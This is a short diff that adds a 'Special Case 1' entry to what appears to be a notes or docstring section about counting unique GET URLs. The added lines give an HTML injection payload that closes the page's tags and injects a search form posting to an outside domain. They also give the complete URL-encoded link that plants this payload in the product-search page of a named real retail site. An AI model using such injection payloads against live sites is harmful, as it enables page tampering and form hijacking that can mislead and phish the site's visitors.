@@ -115,6 +115,12 @@ Unique GET URLs:
     b. BUT if they have DIFFERENT FORM ACTIONS, then there will be 4 UNIQUE GET URLS.
 
 
+Special Case 1:
+1. https://www.borsheims.com/
+2. Payload: 
+</span></h1><div style="background-color:lightblue;"><h1>DrudgeReport Form</h1><form action="//www.drudgereportArchives.com/dsp/search.htm" method="GET" name="searchForm" target="_top" style="margin:0px;padding:0px;"> 			 			<input type="Text" class="dra" name="searchFor" size="20" maxlength="500" value=""> 			<input type="Submit" value="Search Archives" class="dra"> 		</form></div><h1><span><!--
+3. Complete Link with Paylaod: 
+https://www.borsheims.com/product-search?Search=%3C%2Fspan%3E%3C%2Fh1%3E%3Cdiv+style%3D%22background-color%3Alightblue%3B%22%3E%3Ch1%3EDrudgeReport+Form%3C%2Fh1%3E%3Cform+action%3D%22%2F%2Fwww.drudgereportArchives.com%2Fdsp%2Fsearch.htm%22+method%3D%22GET%22+name%3D%22searchForm%22+target%3D%22_top%22+style%3D%22margin%3A0px%3Bpadding%3A0px%3B%22%3E+%09%09%09+%09%09%09%3Cinput+type%3D%22Text%22+class%3D%22dra%22+name%3D%22searchFor%22+size%3D%2220%22+maxlength%3D%22500%22+value%3D%22%22%3E+%09%09%09%3Cinput+type%3D%22Submit%22+value%3D%22Search+Archives%22+class%3D%22dra%22%3E+%09%09%3C%2Fform%3E%3C%2Fdiv%3E%3Ch1%3E%3Cspan%3E%3C%21--
 
 """
 
